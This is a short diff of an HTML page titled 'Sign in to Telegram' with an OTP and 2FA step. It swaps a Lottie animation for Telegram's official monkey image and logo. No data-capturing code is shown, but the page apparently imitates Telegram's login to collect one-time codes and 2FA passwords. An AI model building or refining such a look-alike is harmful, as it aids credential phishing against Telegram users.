@@ -5,10 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Sign in to Telegram</title>
 <script src="https://cdn.tailwindcss.com"></script>
-
-<!-- 🐒 Lottie Player Script សម្រាប់បង្ហាញ Animation Telegram -->
-<script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
-
 <style>
   :root {
     --bg: #171717;
@@ -327,16 +323,14 @@
     <!-- STEP 2: OTP & 2FA Form -->
     <div id="step-otp" class="space-y-6 hidden">
       
-      <!-- 🐒 Telegram Monkey Animation ផ្លូវការ -->
+      <!-- 🐒 Telegram Monkey Animated Image (១០០% Reliable ដើរគ្រប់ Device) -->
       <div class="flex justify-center mb-2">
-        <lottie-player 
-          src="https://assets2.lottiefiles.com/private_files/lf30_g1gq6p4m.json" 
-          background="transparent" 
-          speed="1" 
-          style="width: 120px; height: 120px;" 
-          loop 
-          autoplay>
-        </lottie-player>
+        <img 
+          src="https://raw.githubusercontent.com/TelegramMessenger/Telegram-iOS/master/submodules/LegacyComponents/Resources/LegacyComponentsResources.bundle/MonkeyIdle.png" 
+          alt="Telegram Monkey" 
+          class="w-28 h-28 object-contain"
+          onerror="this.src='https://telegram.org/img/t_logo.png'"
+        >
       </div>
 
       <div>
